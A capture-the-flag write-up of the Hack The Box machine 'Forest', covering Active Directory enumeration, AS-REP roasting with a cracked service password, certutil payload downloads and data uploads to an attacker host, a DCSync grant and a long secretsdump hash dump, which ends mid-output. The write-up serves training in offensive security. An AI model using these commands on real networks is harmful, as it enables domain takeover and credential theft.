@@ -1,0 +1,683 @@
+# HTB: Forest
+
+***Overview**: Forest is a HTB machine rated as easy. This box encompasses various techniques used in AD enumeration and exploitation. Techniques like AD enumeration using RPC and LDAP, exploitation techniques like AS-REP Roasting. We also visualized our AD attack paths using a tool known as Bloodhound. I really enjoyed the Box and I hope you enjoy reading my writeup as much :)*
+
+## Scanning and Reconnaissance
+- So firstly we can run our nmap scan, so we can first scan for the common ports
+```shell
+┌──(kali㉿kali)-[~]
+└─$ nmap -sV -sC -A 10.10.10.161      
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-02 10:36 EDT
+Nmap scan report for 10.10.10.161
+Host is up (0.19s latency).
+Not shown: 989 closed tcp ports (conn-refused)
+PORT     STATE SERVICE      VERSION
+53/tcp   open  domain       Simple DNS Plus
+88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2023-06-02 14:44:11Z)
+135/tcp  open  msrpc        Microsoft Windows RPC
+139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 2h26m49s, deviation: 4h02m31s, median: 6m48s
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+| smb2-time: 
+|   date: 2023-06-02T14:44:34
+|_  start_date: 2023-06-02T14:41:59
+| smb2-security-mode: 
+|   311: 
+|_    Message signing enabled and required
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+|   Computer name: FOREST
+|   NetBIOS computer name: FOREST\x00
+|   Domain name: htb.local
+|   Forest name: htb.local
+|   FQDN: FOREST.htb.local
+|_  System time: 2023-06-02T07:44:36-07:00
+
+```
+- then we can do a full port scan using masscan 
+```shell
+┌──(kali㉿kali)-[~/PNPT/machines]
+└─$ sudo masscan -p1-65535 10.10.10.161 --rate=1000 -e tun0 > forest
+[sudo] password for kali: 
+Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2023-06-02 14:37:49 GMT
+Initiating SYN Stealth Scan
+Scanning 1 hosts [65535 ports/host]
+                                                                                                                                                                       
+┌──(kali㉿kali)-[~/PNPT/machines]
+└─$ cat forest  
+Discovered open port 3269/tcp on 10.10.10.161                                  
+Discovered open port 464/tcp on 10.10.10.161                                   
+Discovered open port 49677/tcp on 10.10.10.161                                 
+Discovered open port 636/tcp on 10.10.10.161                                   
+Discovered open port 135/tcp on 10.10.10.161                                   
+Discovered open port 49684/tcp on 10.10.10.161                                 
+Discovered open port 53/tcp on 10.10.10.161                                    
+Discovered open port 49666/tcp on 10.10.10.161                                 
+Discovered open port 47001/tcp on 10.10.10.161                                 
+Discovered open port 445/tcp on 10.10.10.161                                   
+Discovered open port 49676/tcp on 10.10.10.161                                 
+Discovered open port 9389/tcp on 10.10.10.161                                  
+Discovered open port 3268/tcp on 10.10.10.161                                  
+Discovered open port 49671/tcp on 10.10.10.161                                 
+Discovered open port 593/tcp on 10.10.10.161                                   
+Discovered open port 5985/tcp on 10.10.10.161                                  
+Discovered open port 389/tcp on 10.10.10.161                                   
+Discovered open port 49664/tcp on 10.10.10.161                                 
+Discovered open port 49706/tcp on 10.10.10.161                                 
+Discovered open port 88/tcp on 10.10.10.161                                    
+Discovered open port 49667/tcp on 10.10.10.161                                 
+Discovered open port 49665/tcp on 10.10.10.161                                 
+Discovered open port 139/tcp on 10.10.10.161
+```
+- and then run Nmap 
+```
+┌──(gr4y㉿kali)-[~/HTB]
+└─$ ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')
+
+┌──(gr4y㉿kali)-[~/HTB]
+└─$ nmap -Pn -sV -sC -p$ports -oA nmap/forest_full 10.10.10.161 -v
+** SNIP **
+
+PORT      STATE  SERVICE           VERSION
+53/tcp    open   domain            Simple DNS Plus
+88/tcp    open   kerberos-sec      Microsoft Windows Kerberos (server time: 2023-08-04 20:46:14Z)
+135/tcp   open   msrpc             Microsoft Windows RPC
+139/tcp   open   netbios-ssn       Microsoft Windows netbios-ssn
+389/tcp   open   ldap              Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+445/tcp   open   Eicrosof          Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
+464/tcp   open   kpasswd5?
+593/tcp   open   ncacn_http        Microsoft Windows RPC over HTTP 1.0
+636/tcp   open   tcpwrapped
+3268/tcp  open   ldap              Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+3269/tcp  open   globalcatLDAPssl?
+5985/tcp  open   http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open   mc-nmf            .NET Message Framing
+47001/tcp open   http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open   msrpc             Microsoft Windows RPC
+49665/tcp open   msrpc             Microsoft Windows RPC
+49666/tcp open   msrpc             Microsoft Windows RPC
+49667/tcp open   msrpc             Microsoft Windows RPC
+49671/tcp closed unknown
+49676/tcp open   ncacn_http        Microsoft Windows RPC over HTTP 1.0
+49677/tcp open   msrpc             Microsoft Windows RPC
+49684/tcp open   msrpc             Microsoft Windows RPC
+49703/tcp open   msrpc             Microsoft Windows RPC
+49951/tcp closed unknown
+Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2023-08-04T20:47:11
+|_  start_date: 2023-08-04T13:47:38
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+|_clock-skew: mean: 2h26m57s, deviation: 4h02m31s, median: 6m55s
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+|   Computer name: FOREST
+|   NetBIOS computer name: FOREST\x00
+|   Domain name: htb.local
+|   Forest name: htb.local
+|   FQDN: FOREST.htb.local
+|_  System time: 2023-08-04T13:47:13-07:00
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+```
+we can also do the below to get just the ports separated by a `,` from the ports file
+```
+┌──(kali㉿kali)-[~/PNPT/machines]
+└─$ cat forest | cut -d ' ' -f 4 | tr -s "/tcp\n" ","
+3269,464,49677,636,135,49684,53,49666,47001,445,49676,9389,3268,49671,593,5985,389,49664,49706,88,49667,49665,139,
+```
+- we can see RPC ports are open, and we can see below that we can use a tool known as RPCClient to enumerate users, groups and so on, so why don't we try it out :)
+
+![](assets/Forest_assets/Pasted%20image%2020230605002118.png)
+
+- More on this [Enumerating Windows Domains with rpcclient through SocksProxy == Bypassing Command Line Logging - Red Team Notes (ired.team)](https://www.ired.team/offensive-security/enumeration-and-discovery/enumerating-windows-domains-using-rpcclient-through-socksproxy-bypassing-command-line-logging)
+- so after running the `rpcclient`, we run the command `enumdomusers` to enumerate domain users
+```shell
+┌──(kali㉿kali)-[~/Downloads]
+└─$ rpcclient -U '' -N 10.10.10.161                                 
+rpcclient $> enumdomusers
+user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[DefaultAccount] rid:[0x1f7]
+user:[$331000-VK4ADACQNUCA] rid:[0x463]
+user:[SM_2c8eef0a09b545acb] rid:[0x464]
+user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
+user:[SM_75a538d3025e4db9a] rid:[0x466]
+user:[SM_681f53d4942840e18] rid:[0x467]
+user:[SM_1b41c9286325456bb] rid:[0x468]
+user:[SM_9b69f1b9d2cc45549] rid:[0x469]
+user:[SM_7c96b981967141ebb] rid:[0x46a]
+user:[SM_c75ee099d0a64c91b] rid:[0x46b]
+user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
+user:[HealthMailboxc3d7722] rid:[0x46e]
+user:[HealthMailboxfc9daad] rid:[0x46f]
+user:[HealthMailboxc0a90c9] rid:[0x470]
+user:[HealthMailbox670628e] rid:[0x471]
+user:[HealthMailbox968e74d] rid:[0x472]
+user:[HealthMailbox6ded678] rid:[0x473]
+user:[HealthMailbox83d6781] rid:[0x474]
+user:[HealthMailboxfd87238] rid:[0x475]
+user:[HealthMailboxb01ac64] rid:[0x476]
+user:[HealthMailbox7108a4e] rid:[0x477]
+user:[HealthMailbox0659cc1] rid:[0x478]
+user:[sebastien] rid:[0x479]
+user:[lucinda] rid:[0x47a]
+user:[svc-alfresco] rid:[0x47b]
+user:[andy] rid:[0x47e]
+user:[mark] rid:[0x47f]
+user:[santi] rid:[0x480]
+```
+- we can see that we have found a couple of valid domain users, I decided to exclude those mailbox accounts (which shows that Exchange is running) as I enumerated further, so:
+
+```
+Administrator
+Guest
+krbtgt
+DefaultAccount
+sebastien
+lucinda
+svc-alfresco
+andy
+mark
+santi
+```
+- we can also verify that these are valid domain users using `kerbrute`
+
+```shell
+┌──(kali㉿kali)-[~/PNPT/machines]
+└─$ kerbrute userenum --dc 10.10.10.161 -d htb.local userlist.txt
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: v1.0.3 (9dad6e1) - 06/04/23 - Ronnie Flathers @ropnop
+
+2023/06/04 19:12:27 >  Using KDC(s):
+2023/06/04 19:12:27 >   10.10.10.161:88
+
+2023/06/04 19:12:27 >  [+] VALID USERNAME:       Administrator@htb.local
+2023/06/04 19:12:27 >  [+] VALID USERNAME:       svc-alfresco@htb.local
+2023/06/04 19:12:27 >  [+] VALID USERNAME:       santi@htb.local
+2023/06/04 19:12:27 >  [+] VALID USERNAME:       mark@htb.local
+2023/06/04 19:12:27 >  [+] VALID USERNAME:       sebastien@htb.local
+2023/06/04 19:12:27 >  [+] VALID USERNAME:       andy@htb.local
+2023/06/04 19:12:27 >  [+] VALID USERNAME:       lucinda@htb.local
+2023/06/04 19:12:27 >  Done! Tested 10 usernames (7 valid) in 0.182 seconds
+```
+- Now we can use the impacket GetNPUsers script to discover AS-REPRoastable accounts, that is those account that don't have Kerberos Pre-authentication set
+```
+┌──(kali㉿kali)-[~/PNPT/machines]
+└─$ impacket-GetNPUsers htb.local/ -dc-ip 10.10.10.161 -usersfile users -format hashcat -outputfile hashes.txt
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
+                                                                                                                                                                       
+┌──(kali㉿kali)-[~/PNPT/machines]
+└─$ ls
+forest  hashes.txt  userlist.txt  users
+                                                                                                                                                                       
+┌──(kali㉿kali)-[~/PNPT/machines]
+└─$ cat hashes.txt    
+$krb5asrep$23$svc-alfresco@HTB.LOCAL:46cb8cf3efcb45c7e6b2eadaacae91ab$fbb95f1159a162cf1b45a38f015b671467fb3e09f97d534134dce60dbafab87e789df2a4825a980c43a906e30142c88de29434941ff4c7960cc748cbc6fcb95bccdfd7166420bb66573b47bae792aa12abf2ecef802def79ffc094dcd953e7eb7dfafa9b544eb67b7fb4e2baede3a763789978b0a7398e5a446f39ae2df4cfae9543e97fd47809ce4e5214335f0893b5418c871bcb3d4745b86c9b9cac83ac1e26ae4c9ae5b5c16bfaa5abc8bdc2b988b7b647341c94cd3b0def050b5f43dc64fb265aab9dd776224cd587530bbe2f70e422c24eed6ed17ce8b27bf4021ba227eaa3382556ca
+```
+- From the above we can see that the service account `svc-alfresco` account is AS-REPRoastable and we also were able to retrieve the password hash of this account, this is because the GetNPUsers script request the TGT of the user account and the hash of this user is also included in this TGT, so we were able to retrieve the hash
+- so we can further use john to attempt to crack the hash and we were able to successfully retrieve the password of the user
+
+![](assets/Forest_assets/Pasted%20image%2020230605004359.png)
+
+- we can use crackmapexec to verify that those are valid credentials
+
+![](assets/Forest_assets/Pasted%20image%2020230605005034.png)
+
+- we can also list the smb shares using the credentials 
+```shell
+┌──(kali㉿kali)-[~/PNPT/machines]
+└─$ smbclient -L \\\\htb.local\\ -I 10.10.10.161 -U svc-alfresco --password=s3rvice
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share 
+        SYSVOL          Disk      Logon server share 
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to htb.local failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+
+```
+## Foothold
+- since we have Win-RM open, port 5985, we can gain foothold using `evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice`
+
+![](assets/Forest_assets/Pasted%20image%2020230606100002.png)
+
+- then we can retrieve our flag
+
+![](assets/Forest_assets/Pasted%20image%2020230606100330.png)
+
+## Privilege Escalation
+- so now we want to find privilege escalation paths, by visualizing our AD usind Bloodhound
+- firstly we transfer our collector which is Sharphound  using `certutil.exe -urlcache -split -f http://10.10.14.83/SharpHound.exe SharpHound.exe` after spinning up a python server on our attack machine
+- then we can run the script using
+`. .\SharpHound.exe --collectionmethods All --zipfilename output.zip`
+
+![](assets/Forest_assets/Pasted%20image%2020230606200503.png)
+
+- and we get our Zip file
+- Now we have to transfer our zip file to our attack machine so Bloodhound can injest it
+- so I want to cover two ways of transferring the zip file from the windows machine to our machine
+#### Transfer Method 1: Using impacket-smbserver
+- so on our attack machine we run the commands below
+```
+mkdir smb
+impacket-smbserver smb ~/PNPT/machines/smb 
+```
+![](assets/Forest_assets/Pasted%20image%2020230622131355.png)
+
+- then on the windows machine, we then run the commands
+```
+net use \\10.10.14.12\smb
+cp 20230622044953_output.zip \\10.10.14.12\smb
+```
+- OR on windows machine run, we can run the commands instead 
+```
+New-PSDrive -Name "smb" -PSProvider "FileSystem" -Root "\\10.10.14.12\smb"
+cp 20230622044953_output.zip \\10.10.14.12\smb
+```
+
+![](assets/Forest_assets/Pasted%20image%2020230622131647.png)
+
+- and we will find the zip file in the `smb` directory
+
+#### Transfer Method 2: using a custom script upload.php
+- Obtained from [File Transfer Techniques | 0xBEN - Notes & Cheat Sheets (benheater.com)](https://notes.benheater.com/books/file-transfers-and-data-exfiltration/page/file-transfer-techniques)
+- On attack machine, we will create a script upload.php in our `/var/www/html/` directory
+- then paste the php code in the upload.php script
+
+```php
+<?php
+    $uploadDirectory = '/var/www/html/uploads/';
+    $uploadFile = $uploadDirectory . $_FILES['file']['name'];
+    move_uploaded_file($_FILES['file']['tmp_name'], $uploadFile);
+?>
+```
+
+- we then create an uploads directory on our attack machine, to receive whatever we will be uploading `sudo mkdir /var/www/html/uploads`
+- change the ownership of that directory `sudo chown www-data:www-data /var/www/html/uploads`
+- start an apache server in the `/var/www/html/1` directory using `sudo systemctl start apache2`
+- then on the target, which is a windows machine we run the command
+
+```
+[System.Net.WebClient]::new().UploadFile('http://10.10.14.83/upload.php', 'C:\Temp\20230727053545_BloodHound.zip')
+```
+
+- So now after transferring the zip file to our attack machine, we can then start our bloodhound
+- we do `sudo neo4j console` to start our neo4j database
+- then `sudo bloodhound --no-sandbox` and enter credentials
+- then we upload the zip file to bloodhound and allow it to injest the files and all the JSON data retrieved
+- we can search SVC-ALFRESCO@HTB.LOCAL right click the node and mark as owned
+- we can view the node info to see what group memberships we have and other information, we will see that we are a part of the Account Operators group which is a privileged group and we are also part of the Remote Management Users Group
+
+![](assets/Forest_assets/Pasted%20image%2020230805214351.png)
+
+- we can find more information about the Account Operators group at [Active Directory security groups | Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#administrators)
+
+![](assets/Forest_assets/Pasted%20image%2020230805214717.png)
+
+- moving forward, if we set the start node as Account operators and end node as Domain Admins we can see the path
+
+![](assets/Forest_assets/Pasted%20image%2020230804163946.png)
+
+- we can also use the Query, "Find Shortest Paths to Domain Admins" and other queries as well
+- we know that we (svc-alfresco) are part of the account operators group and see that the account operators group have GenericAll privileges to the "Exchange Windows Permissions group", we can quote from the [bloodhound documentation](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html) that
+
+>With GenericAll Over a Group:
+>Full control of a group allows you to directly modify group membership of the group.  so this means we can add members to that group
+- so we can create a new user and add it to the domain using the command 
+```
+net user gr4y password123 /ADD /DOMAIN
+```
+- then add the user to the Exchange Windows Permissions group
+
+```
+Add-ADGroupMember -Identity "Exchange Windows Permissions" -Members "gr4y"
+```
+- then we can verify that it got added using the command
+```
+Get-ADGroupMember -Identity "Exchange Windows Permissions"
+```
+
+![](assets/Forest_assets/Pasted%20image%2020230804165023.png)
+
+- so now that we have added our  gr4y user to the "Exchange Windows Permissions" group, this  means that we have WriteDacl permissions to the HTB.local domain 
+- so with this privilege, we can grant ourself the ability to DCSync
+- we need to authenticate to the Domain Controller as a member of EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL because we are not running a process as a member. 
+- To do this in conjunction with `Add-DomainObjectAcl`, we first create a PSCredential object:
+
+```ad-note
+New-Object System Management.Automation.PSCredential is a cmdlet that takes the username and password and creates a credential object. 
+- The PSCredential object represents a set of security credentials such as a username and password
+- this object can now be passed as a parameter to a function that run as the user account in the credential oject.
+```
+
+- we do this using the commands:
+```
+$SecPassword = ConvertTo-SecureString 'password123' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('htb.local\gr4y', $SecPassword)
+```
+- we the `Add-DomainObjectAcl` cmdlet is part of our PoweView, so we have to import it first `certutil.exe -urlcache -split -f http://10.10.14.83/PowerView.ps1 PowerView.ps1`
+
+```ad-note
+the Add-DomainObjectAcl cmdlet in Powersploit adds an ACL for a specific active directory object
+```
+
+- then we can run it and add the ACL to the htb.local domain using the commands:
+```
+ . ./PowerView.ps1
+Add-DomainObjectAcl -PrincipalIdentity gr4y -Credential $Cred -Rights DCSync
+```
+- we can verify that we have added the DCSunc rights with this command below
+```
+Get-DomainObjectAcl -Identity gr4y -domain htb.local -ResolveGUIDs
+```
+![](assets/Forest_assets/Pasted%20image%2020230804182554.png)
+
+we will see permission rights like **DS-Replication-Get-Changes**, **Replicating Directory Changes All** and **Replicating Directory Changes In Filtered Set**.
+
+- so now we can  perform a DCSync attack
+
+```ad-note
+- there are several techniques to dump credentials from a compromised endpoint, like obtaining them from LSASS Memory, SAM database, cached domain credentials or Replicating Directory Permissions
+- AD accounts with " Replication Directory Changes" allow attackers to retrieve credentials using the DCSync attack
+- Replication in Active Directory ensures that every domain controller synchronizes data changes within the same datacenter or across sites.
+- An attacker can compromise standard, non-privileged user accounts with “Replicate Directory Changes” permission and performs malicious replication to steal credentials.
+- Additionally, any security principal with one of the following rights delegated at the domain level can also successfully retrieve password hash data using the DCSync attack.
+	- GenericAll (Full Control)
+	- AllExtendedRights
+- The DCSync attack is a well-known credential dumping technique that enables attackers to obtain sensitive information from the AD database. The DCSync attack allows attackers to simulate the replication process from a remote Domain Controller (DC) and request credentials from another DC.
+- DCSync functionality is part of the “lsadump” module in Mimikatz, an Open-Source application for credential dumping
+- DCSync functionality is part of the “lsadump” module in Mimikatz, an Open-Source application for credential dumping
+- Read well at [Protecting Against Active Directory DCSync Attacks - SentinelOne](https://www.sentinelone.com/blog/active-directory-dcsync-attacks/)
+```
+
+- we can perform this attack two ways, wither using Mimikatz or using impacket secretsdump script
+- Using mimikatz, after importing the script, will run the commands: 
+```
+./mimikatz.exe
+privilege::debug
+lsadump::dcsync /user:gr4y\Administrator
+lsadump::dcsync /user:gr4y\krgtgt
+```
+- But I used secretsdump script because mimikatz was misbehaving for some reason
+- so on our attack machine we will use `impacket-secretsdump` using the command bellow and the credentials of our user with the DCSync rights
+
+```shell
+──(gr4y㉿kali)-[~/HTB]
+└─$ impacket-secretsdump -just-dc gr4y:password123@10.10.10.161 -outputfile dcsync_hashes 
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_9b69f1b9d2cc45549:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_7c96b981967141ebb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_c75ee099d0a64c91b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\HealthMailboxc3d7722:1134:aad3b435b51404eeaad3b435b51404ee:4761b9904a3d88c9c9341ed081b4ec6f:::
+htb.local\HealthMailboxfc9daad:1135:aad3b435b51404eeaad3b435b51404ee:5e89fd2c745d7de396a0152f0e130f44:::
+htb.local\HealthMailboxc0a90c9:1136:aad3b435b51404eeaad3b435b51404ee:3b4ca7bcda9485fa39616888b9d43f05:::
+htb.local\HealthMailbox670628e:1137:aad3b435b51404eeaad3b435b51404ee:e364467872c4b4d1aad555a9e62bc88a:::
+htb.local\HealthMailbox968e74d:1138:aad3b435b51404eeaad3b435b51404ee:ca4f125b226a0adb0a4b1b39b7cd63a9:::
+htb.local\HealthMailbox6ded678:1139:aad3b435b51404eeaad3b435b51404ee:c5b934f77c3424195ed0adfaae47f555:::
+htb.local\HealthMailbox83d6781:1140:aad3b435b51404eeaad3b435b51404ee:9e8b2242038d28f141cc47ef932ccdf5:::
+htb.local\HealthMailboxfd87238:1141:aad3b435b51404eeaad3b435b51404ee:f2fa616eae0d0546fc43b768f7c9eeff:::
+htb.local\HealthMailboxb01ac64:1142:aad3b435b51404eeaad3b435b51404ee:0d17cfde47abc8cc3c58dc2154657203:::
+htb.local\HealthMailbox7108a4e:1143:aad3b435b51404eeaad3b435b51404ee:d7baeec71c5108ff181eb9ba9b60c355:::
+htb.local\HealthMailbox0659cc1:1144:aad3b435b51404eeaad3b435b51404ee:900a4884e1ed00dd6e36872859c03536:::
+htb.local\sebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc:::
+htb.local\lucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::
+htb.local\svc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::
+htb.local\andy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::
+htb.local\mark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::
+htb.local\santi:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::
+john:9601:aad3b435b51404eeaad3b435b51404ee:a9a10592208f7d0d6d5ec08c1aca1873:::
+gr4y:9602:aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da:::
+john2:9603:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
+luqman:9604:aad3b435b51404eeaad3b435b51404ee:af8c1ff67a8d011a4409d35670fb0c08:::
+kate:9605:aad3b435b51404eeaad3b435b51404ee:46ff67a468c88e5bd82afc31b7f4e4e2:::
+FOREST$:1000:aad3b435b51404eeaad3b435b51404ee:7fdd4ab7dd556305dead250be5bd8540:::
+EXCH01$:1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1:::
+[*] Kerberos keys grabbed
+htb.local\Administrator:aes256-cts-hmac-sha1-96:910e4c922b7516d4a27f05b5ae6a147578564284fff8461a02298ac9263bc913
+htb.local\Administrator:aes128-cts-hmac-sha1-96:b5880b186249a067a5f6b814a23ed375
+htb.local\Administrator:des-cbc-md5:c1e049c71f57343b
+krbtgt:aes256-cts-hmac-sha1-96:9bf3b92c73e03eb58f698484c38039ab818ed76b4b3a0e1863d27a631f89528b
+krbtgt:aes128-cts-hmac-sha1-96:13a5c6b1d30320624570f65b5f755f58
+krbtgt:des-cbc-md5:9dd5647a31518ca8
+htb.local\HealthMailboxc3d7722:aes256-cts-hmac-sha1-96:258c91eed3f684ee002bcad834950f475b5a3f61b7aa8651c9d79911e16cdbd4
+htb.local\HealthMailboxc3d7722:aes128-cts-hmac-sha1-96:47138a74b2f01f1886617cc53185864e
+htb.local\HealthMailboxc3d7722:des-cbc-md5:5dea94ef1c15c43e
+htb.local\HealthMailboxfc9daad:aes256-cts-hmac-sha1-96:6e4efe11b111e368423cba4aaa053a34a14cbf6a716cb89aab9a966d698618bf
+htb.local\HealthMailboxfc9daad:aes128-cts-hmac-sha1-96:9943475a1fc13e33e9b6cb2eb7158bdd
+htb.local\HealthMailboxfc9daad:des-cbc-md5:7c8f0b6802e0236e
+htb.local\HealthMailboxc0a90c9:aes256-cts-hmac-sha1-96:7ff6b5acb576598fc724a561209c0bf541299bac6044ee214c32345e0435225e
+htb.local\HealthMailboxc0a90c9:aes128-cts-hmac-sha1-96:ba4a1a62fc574d76949a8941075c43ed
+htb.local\HealthMailboxc0a90c9:des-cbc-md5:0bc8463273fed983
+htb.local\HealthMailbox670628e:aes256-cts-hmac-sha1-96:a4c5f690603ff75faae7774a7cc99c0518fb5ad4425eebea19501517db4d7a91
+htb.local\HealthMailbox670628e:aes128-cts-hmac-sha1-96:b723447e34a427833c1a321668c9f53f
+htb.local\HealthMailbox670628e:des-cbc-md5:9bba8abad9b0d01a
+htb.local\HealthMailbox968e74d:aes256-cts-hmac-sha1-96:1ea10e3661b3b4390e57de350043a2fe6a55dbe0902b31d2c194d2ceff76c23c
+htb.local\HealthMailbox968e74d:aes128-cts-hmac-sha1-96:ffe29cd2a68333d29b929e32bf18a8c8
+htb.local\HealthMailbox968e74d:des-cbc-md5:68d5ae202af71c5d
+htb.local\HealthMailbox6ded678:aes256-cts-hmac-sha1-96:d1a475c7c77aa589e156bc3d2d92264a255f904d32ebbd79e0aa68608796ab81
+htb.local\HealthMailbox6ded678:aes128-cts-hmac-sha1-96:bbe21bfc470a82c056b23c4807b54cb6
+htb.local\HealthMailbox6ded678:des-cbc-md5:cbe9ce9d522c54d5
+htb.local\HealthMailbox83d6781:aes256-cts-hmac-sha1-96:d8bcd237595b104a41938cb0cdc77fc729477a69e4318b1bd87d99c38c31b88a
+htb.local\HealthMailbox83d6781:aes128-cts-hmac-sha1-96:76dd3c944b08963e84ac29c95fb182b2
+htb.local\HealthMailbox83d6781:des-cbc-md5:8f43d073d0e9ec29
+htb.local\HealthMailboxfd87238:aes256-cts-hmac-sha1-96:9d05d4ed052c5ac8a4de5b34dc63e1659088eaf8c6b1650214a7445eb22b48e7
+htb.local\HealthMailboxfd87238:aes128-cts-hmac-sha1-96:e507932166ad40c035f01193c8279538
+htb.local\HealthMailboxfd87238:des-cbc-md5:0bc8abe526753702
+htb.local\HealthMailboxb01ac64:aes256-cts-hmac-sha1-96:af4bbcd26c2cdd1c6d0c9357361610b79cdcb1f334573ad63b1e3457ddb7d352
+htb.local\HealthMailboxb01ac64:aes128-cts-hmac-sha1-96:8f9484722653f5f6f88b0703ec09074d
